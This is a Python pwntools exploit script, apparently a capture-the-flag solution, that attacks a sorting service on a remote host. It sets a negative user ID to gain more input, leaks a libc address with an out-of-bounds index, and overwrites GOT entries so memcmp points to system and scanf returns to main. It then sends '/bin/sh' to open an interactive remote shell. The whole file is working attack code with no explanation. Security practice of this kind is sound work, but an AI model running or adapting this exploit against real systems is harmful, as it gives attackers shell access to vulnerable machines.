#!/usr/bin/env python
from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('128.199.135.210', 31335)

libc = ELF('libc6_2.24-3ubuntu2.2_i386.so')
main = 0x08048942

# login as root for more number to sort
r.sendafter('Enter your password:', '\n')
r.sendlineafter('Please set your user_id: ', '-65536') # -65536 == 0xffff0000

r.sendlineafter('How many numbers do you want to sort ?', '127')
for i in range(127):
    r.sendline('0')

# leak libc address
r.sendlineafter('Enter -1 to break', '-21')
r.recvline()
libc_base = int(r.recvline(), 16) - libc.symbols['read']
log.success('libc base: ' + hex(libc_base))

system = libc_base + libc.symbols['system']
xor_eax_eax_ret = libc_base + 0x0002c92c

r.sendline('-1')
r.sendlineafter('Enter value to find', str(0x6fffffff))

# -19 => memcmp
# -16 => open
# -13 => scanf

# hijack memcmp to system 
for i in range(41-19):
    r.sendafter('Do you want to edit it ?', 'n')
r.sendafter('Do you want to edit it ?', 'y')
r.sendlineafter('Enter new value', str(system))

# make open just return 0
for i in range(18-16):
    r.sendafter('Do you want to edit it ?', 'n')
r.sendafter('Do you want to edit it ?', 'y')
r.sendlineafter('Enter new value', str(xor_eax_eax_ret))

# hijack scanf to main
for i in range(15-13):
    r.sendafter('Do you want to edit it ?', 'n')
r.sendafter('Do you want to edit it ?', 'y')
r.sendlineafter('Enter new value', str(main))

# trigger scanf to return to main
r.sendafter('Do you want to edit it ?', 'y')

r.sendafter('Enter new value\n', '/bin/sh\x00')
r.sendafter('Enter your password:\n', 'deadbeef')

r.interactive()
